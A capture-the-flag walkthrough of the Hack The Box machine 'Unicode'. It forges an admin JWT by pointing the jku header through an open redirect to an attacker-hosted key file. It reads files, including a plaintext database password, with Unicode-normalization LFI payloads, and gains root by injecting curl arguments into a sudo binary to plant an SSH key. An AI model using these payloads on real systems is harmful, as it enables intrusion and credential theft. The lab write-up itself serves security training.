![image](https://user-images.githubusercontent.com/64952843/165166129-a70c82e7-12d8-4280-965e-f8cdd97b6913.png)

# [UNICODE- BOX]            

  Hi folks, today I am going to solve a medium rated hack the box machine,Unicode created by webspl01t3r.So without any further intro, let's jump in. 
# common enumeration   

## Nmap
 *TCP over SSH
  *HTTP Default page
  *Host OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
  
#### code-Nmap
```bash
nmap -sC -sV  -A -oN nmap/unicode 10.10.11.126 
```

#### output

![[Unicode/unicode png/nmap.png]]

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-10 08:55 EDT
Nmap scan report for 10.10.11.126
Host is up (0.45s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA)
|   256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA)
|_  256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: 503
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.45 seconds
```

## Default Page- HACKMEDIA
so lets chek at the Default page at  http://10.10.11.126 

![[Unicode/unicode png/WEB.png]]

Browsing to port 80, we are shown a landing page for `Hackmedia` with registration and login functionality.

#### output

![[LOGIN.png]]

#### output

![[Unicode/unicode png/registration.png]]

so lets register and sign in 

#### output

![[hackmedia.png]]

we get a dashboard lets  check to see the links but they seem to go nowhere but there is a `powered by flask`  so we know this is a python web application so i decide to open the upload with an intention of `posting a threat`

#### output

![[Unicode/unicode png/upload.png]]

but it seem it once a `pdf` because that is what is being recognized in my `Browser files`
when i upload a pdf it comes with a Thank you message this seems as dead end

#### output

![[Thanks.png]]

so i decide to open `burpsuite` to analyse it 

![[Unicode/unicode png/burp.png]]

a found a `jwt` token because it has a` header, payload and signature` and are base64 encoded 

```bash
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoibGVzaGFjazk4In0.de9taXbTEwpf9U_VJqjdWXptnAZf7VrFm2vAhAtmzY8PPtAxROz2KlD7SBAHQUpNtinIVFYEXSf5GLXWrT2NTEPwh3ePzif6WwRrhfsYozGX6DV6fKflBzSU0NfpvAzt0Csd8xS47jlCEmn7CjsryQwMIA8w5Oz4oLgs3N10tlAVot11KuMZmj9ZtfVSGI4KJ2AS_CP5j7upyhlsgwYQXrTUe8S8-QPXcfW5dueS4c8lwlZZGdp8sYRnqwjG18X3w35shBwJJZHTNNj_cFLfMnSwzZq7hPWrCJQ_yI-JDlxwf370gTaKnbvUU4CDbfDswxdQ__NBI4Epd0ElfdeJ0A
```

lets decode the header it with burp by adding an `==`  to capture the padding 

```bash
{"typ":"JWT","alg":"RS256","jku":"http://hackmedia.htb/static/jwks.json"}
```

so i decide to open [jwt.io](https://jwt.io/) to try to analyse further because its loaded to help in signing cookies

![[jwt.png]]

As you can see in the jwt we have a host name lets add it to `etc/hosts`

#### code-/etc/hosts
```bash
echo 10.10.11.126 hackmedia.htb > /etc/hosts
```

lets check the http://hackmedia.htb/static/jwks.json


#### output 

![[jku.png]]

#### code -jwt
```bash
keys

0

kty

"RSA"

use

"sig"

kid

"hackthebox"

alg

"RS256"

n

"AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs"

e

"AQAB"
```

This is how the `Third party` can validate the keys but the probleum is that the jku is not protected  so lets plan an attack path by changing the jku to point on our machine .

so lets take the  header and save it convected to base64 and edit it 

```bash
echo -n  eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoibGVzaGFjazk4In0 | base64 -d >jwt.header
```

#### output

![[jwtheader.png]]

so lets edit to pont to our machine 

```bash
{"typ":"JWT","alg":"RS256","jku":"http://10.10.16.16:9001/jwks.json"}
```

then lets encode it with this code 

#### code-encoding
```bash
base64  jwt.header -w 0  
```

![[jwtencode.png]]

so we need a  page that can execute without the token to validate a `redirect` and we find it in the `Homepage (Dashboard)` when we send the page without the token it `redirects` us to the login page . so if we change the header to the one we just form and set a `listening port` we find 

#### output

![[failed.png]]

in the homepage it confirms a `redirect` to google.com

#### output

![[redirect.png]]

so lets refine our url to this because it gives as a listening port http://hackmedia.htb/redirect?url=10.10.16.28:9001/jwks.json 

#### output

![[valid.png]]

so lets refine our url to this becuse it gives us a redirect and encode it to base64

#### code-redirect
```bash
{"typ":"JWT","alg":"RS256","jku":"http://hackmedia.htb/static/../redirect?url=10.10.16.28:8000/jwks.json"}
```

#### output

![[encoderedi.png]]

when we set a listening port on `port 8000` we get a response

#### output

![[8000.png]]

so we need to make our our `jwks.json`  because you see now the server connects to us and tries to look for `jwks.json` so lets download the jwks.json 

#### code-wget
```bash
wget http://hackmedia.htb/static/jwks.json
```

#### output

![[jwks.png]]

so lets edit our jwks.json file we can use this tool from github [jwt_tool](https://github.com/ticarpi/jwt_tool) so as to make an admin forged cookie so firt thing we need to do is to start a `Python3 server`

#### code-python-server
```bash
python3 -m http.server 80
```

Then we need to use the following code from the jwt_tool

#### code-jwt_tool
```bash
leshack-jwt_tool <JWT> -X s -ju http://hackmedia.htb/static/../redirect?url=10.10.16.28/jwttool_custom_jwks.json -I -pc user -pv admin 
```

so lets change the `n` and the `e` because the box is ponting to us 

first lets make a ssh 

#### code-ssh
```bash
ssh-keygen -t rsa -b 4096 -m PEM -f jwtRSA256.key    
```

#### output

![[Unicode/unicode png/ssh.png]]

we need to get the `modulus` and `exponet`   to get the `exponet` we 

#### code-exponet(e)
```bash
openssl rsa -text -noout -in jwtRSA256.key
```

#### output

![[EXPONET.png]]

Lets convert this exponet to see if is the same or we need to use it .we are converting it from `Hex` to `base64`

#### code-Hex->base64
```bash
 echo -n 010001 | xxd -r -p |base64 
```

#### output

![[Unicode/unicode png/base64.png]]

As you can see the e is same so lets us check the modulus

#### code-modulus(N)
```bash
openssl rsa -text -noout -in jwtRSA256.key -modulus
```

#### output

![[modulus.png]]

```bash
Modulus=D902A80E741F28BE3D0115296BBFF02940F02CBB9742CCF70771088E3BC0B662079F92946C802B2B20FB2A263F14F46118183688DC6477565EDF792A87F634D9AC1B15BE48B89DAC5330FC330B0370971F5046065D30C36A70B5F2EBAC4DE1EF45E818C4A6BCB76145B39F2AC9B6B85BA13F29854A101E051BB970A851CB5726D289721487A8B6B459D6786D7A59180D7B2D898331B176C8C9919F662A30DCC2D1BFF2C7A02CD02B13BA0E553A7F9426E917D65024A52D9C953AEE2BE3FF9E0B11A67D26981CB7D65D39B28111ED8225E7EE0498EFCBF886F129E5BD6D632EFF5D37F1AC30155A824049BB498F16A48F0F4259E893D0DDF7554DDF421F8CF2C749B009B67D848C93D889B01D45CED37D33B45E5EAE3031F2654CEDA5917C9BC39518A025FFCEDA50DACD43C7D06AD39CA84CD7C324E17F77E6638E85F22F572D0A6734DE0970B302A3EA0EB447E069FB8B669EBF5FEA0B944ABA9D13A23A392491D30B95EE9DC1A74EBD36103BB82A99DB733A2EE97A94CF84CD85713EA8C6B26A2DB0B117C8B6182E272B374917528795527D9A6FAB713D84A4EA6830C14E8822644AF042E420BF1457B6795FD345A653E5AE286711687C7BADF04B1E8B388E3D8B089ECA55C07F212ED4F4D57A2D315213580DD177A1AC550CF22989C53E2D034FE0833478C853C428558AB67B1B3A001170AD20A1D416433820A5ECE49C65
```

so lets conert this modulus to base64 

#### code-modulus(N)->base64

```bash
echo -n D902A80E741F28BE3D0115296BBFF02940F02CBB9742CCF70771088E3BC0B662079F92946C802B2B20FB2A263F14F46118183688DC6477565EDF792A87F634D9AC1B15BE48B89DAC5330FC330B0370971F5046065D30C36A70B5F2EBAC4DE1EF45E818C4A6BCB76145B39F2AC9B6B85BA13F29854A101E051BB970A851CB5726D289721487A8B6B459D6786D7A59180D7B2D898331B176C8C9919F662A30DCC2D1BFF2C7A02CD02B13BA0E553A7F9426E917D65024A52D9C953AEE2BE3FF9E0B11A67D26981CB7D65D39B28111ED8225E7EE0498EFCBF886F129E5BD6D632EFF5D37F1AC30155A824049BB498F16A48F0F4259E893D0DDF7554DDF421F8CF2C749B009B67D848C93D889B01D45CED37D33B45E5EAE3031F2654CEDA5917C9BC39518A025FFCEDA50DACD43C7D06AD39CA84CD7C324E17F77E6638E85F22F572D0A6734DE0970B302A3EA0EB447E069FB8B669EBF5FEA0B944ABA9D13A23A392491D30B95EE9DC1A74EBD36103BB82A99DB733A2EE97A94CF84CD85713EA8C6B26A2DB0B117C8B6182E272B374917528795527D9A6FAB713D84A4EA6830C14E8822644AF042E420BF1457B6795FD345A653E5AE286711687C7BADF04B1E8B388E3D8B089ECA55C07F212ED4F4D57A2D315213580DD177A1AC550CF22989C53E2D034FE0833478C853C428558AB67B1B3A001170AD20A1D416433820A5ECE49C65 | xxd -r -p |base64 -w 0
```

#### output

![[modulusbase64.png]]

so now we have this modulus to `base64` and we can be able to now copy in our `jwks.json` and start a python server

#### code-python-server
```bash
python3 -m  http.server
```

Then we need to use our jwt.io to verfy our signature so as to force an admin cookie  so we need to copy our `private` and `public key`to `jwt.io` which in this case is jwtRSA256.key and .pub
so we need to convert a `private ssh` key into a `public certificate` key  using

#### code-private->public(key)
```bash
openssl rsa -in jwtRSA256.key -pubout -out jwtRSA256.key.pub
```

#### output

![[convertpublictoprivate.png]]

By doing so we get a verified signature 

#### output

![[verifiedjwt.png]]

so lets change the `user to admin ` and also our `jku` to our recently formed new header

#### output

![[usertoadmin.png]]

Then we copy the whole token and go to our webpage so as to copy our new forged admin token

#### output

![[admintoken.png]]

When we replace the auth cookie and refresh the web page we are redirected to the admin's dashboard. we get a new `admin dashboard` 

#### output

![[Unicode/unicode png/admin.png]]

so will i was navigating to check when i clicked the `+ `  for saved reports which does not point to anywhere and went to current month

#### output

![[savedreport.png]]

When navigating to the current month tab we see a message stating T`he Report is being prepared.Please come back later`  and notice the url http://hackmedia.htb/display/?page=monthly.pdf which leads to a suspected `local file inclusion vulnerability`.(LFI) so i decide to chek for a standard LFI using `../../../../../../../etc/passwd`

#### output

![[filenotfound.png]]

when we follow the redirect we get

#### output

![[filternotpassed.png]]

so let me render the file in the Browser but as you can see the 404 message

#### output

![[filenotfound404.png]]

Testing the standard approaches shows no solid indications, but using this this link [unicode text converter](https://qaz.wtf/u/convert.cgi) we can see when submiting `/?page=/etc/passwd` that the website converts this `unicode back to ASCII`.

#### output

![[uvicodetoAscii.png]]

so lets check for unicode normalization and we find a good payload form [Hacktrick.xyz](https://book.hacktricks.xyz/pentesting-web/unicode-normalization-vulnerability) 

#### output

![[hack.png]]

so when i refine the standard LFI to `..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd`
i was able to bypass the filter 

#### output

![[Unicode/unicode png/etc.png]]

#### output

![[passwd.png]]

so what i do when doing the Lfi is to check for the  `cmdline` and i get useful information the file name which is `app`  so i decide to go check for the `environ` and i found userful information the user is propabily `code`

#### code-LFI->environ
```bash
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f/proc/self/environ
```

#### output

![[code.png]]

so let check the `app.py ` because we found it belongs to app file 

#### code-Lfi->app.py
```bash
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f/proc/self/cwd/app.py
```

#### output

![[apppy.png]]

we find it pointing to a database file 

#### code-Lfi->db.yaml
```bash
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f/proc/self/cwd/db.yaml
```

#### output

![[dbyaml.png]]

we get a user and a password let me ssh using this credentials
#### code-credentials
```bash
mysql_host: "localhost"
mysql_user: "code"
mysql_password: "B3stC0d3r2021@@!"
mysql_db: "user"
```

#### code-ssh
```bash
ssh code@hackmedia.htb 
```

#### output

![[shellcode.png]]

## Takeover
 After geting the reverse shell we have to do some adjusment to our reverse shell to make it ready for using by doing a stty escalation to get an interactive shell:
 #### code-stty
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 [ctrl] + z
 stty raw -echo
 fg [Enter] two times
 ```
 
 Then setting the TERM so that you are able to clean the terminal:
 ```bash
 export TERM=xterm
 ```

Now we get the user flag

#### output

![[userflag.png]]
  
## Privilege Escalation-Coder
Checking the sudo entries for code user, we can see that we can execute `/usr/bin/treport` without a password.

#### output

![[treport.png]]

Executing the treport binary reveals that it's a `custom coded report management binary`.

#### output

![[leshack.png]]

Running `strings `on the binary shows it's a Python based binary.

#### code-strings
```bash
strings /usr/bin/treport
```

#### output

![[python.png]]

We copy the binary back to our local machines and begin analysing and testing. It is extremely important that we use [Python version 3.8](https://github.com/deadsnakes/python3.8) for the following steps. Using a tool called `pyinsxtractor`  [pyinsxtractor](https://raw.githubusercontent.com/extremecoders-re/pyinstxtractor/master/pyinstxtractor.py) we can extract the `.pyc` file and try to decode it.

#### code-pyinsxtractor
```bash
 leshack-pyinstxtractor treport   
```

#### output
![[treport2.png]]
Now we need to install `uncompyle6` to decode the `.pyc` file  you will need python3.8.0  i found a good article [here](https://linuxize.com/post/how-to-install-python-3-8-on-ubuntu-18-04/) you can get[ uncompyle6 ](https://github.com/rocky/python-uncompyle6) which supports the python version first install python then use the python to execute the `uncomplyle6`  so as to map it with the version we have just recovered and begin to extract the source code.

#### code-uncomplyle6
```bash
 uncompyle6 treport_extracted/treport.pyc  
```

#### output

![[uncomply.png]]


Now that we have the source code we begin our review and we notice heavy filtering on the `download function`. But, we notice that the characters `{}` and `,`are not filtered.

#### code-treportcode
```bash
def download(self):
now = datetime.now()
current_time = now.strftime('%H_%M_%S')command_injection_list = ['$', '`', ';', '&', '|', '||', '>', '<', '?', "'",
'@', '#', '$', '%', '^', '(', ')']
ip = input('Enter the IP/file_name:')
res = bool(re.search('\\s', ip))
if res:
print('INVALID IP')
sys.exit(0)
if 'file' in ip or 'gopher' in ip or 'mysql' in ip:
print('INVALID URL')
sys.exit(0)
for vars in command_injection_list:
if vars in ip:
print('NOT ALLOWED')
sys.exit(0)
cmd = '/bin/bash -c "curl ' + ip + ' -o /root/reports/threat_report_' +
current_time + '"'
os.system(cmd)
```

Since the code is executing a system command to launch curl we may be able to bypass this with a trick to replace spaces. Using a bypass from [HackTricks](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces)

### METHOD 1->Root.txt
For this you can just **use the** `-K` **option** which let’s you to specify a `config` file to use in cURL and read the flag that way. This the `/root/root.txt` is not in the correct format of a config file, it will just spit out the contents.

#### code-curl-config
```bash
{-K,/root/root.txt}
```

#### output

![[rootm1.png]]

### METHOD 2->Root.txt
is to use the `File:///root/root.txt` as the IP to download the file and it downloaded the file. Then I used the program itself to look at it’s contents.

#### code-file
```bash
File:///root/root.txt
```

#### output

![[rootm2.png]]

Now lets get the root  by root privillage 

### METHOD 3->Root privillage
Now we generate a new ssh to our current directory were the Python webserver is still running.

#### code-ssh-keygen
```bash
ssh-keygen -f unicode
```

Now on the target we launch `sudo /usr/bin/treport` and attempt to inject into the URL of the download to `.pub `key to the machine `authorized_keys`.

#### code-coppying .pub
```bash
{10.10.16.28/unicode.pub,-o,/root/.ssh/authorized_keys}
```

#### output

![[idrsa.png]]

Attempting to `ssh ` as root user on the target

#### code-ssh
```bash
 ssh -i unicode root@hackmedia.htb
```

#### output

![[Unicode/unicode png/root.png]]

Successfully obtained the flag file with root privileges

    -------------------------END successful attack @leshack98----------------------
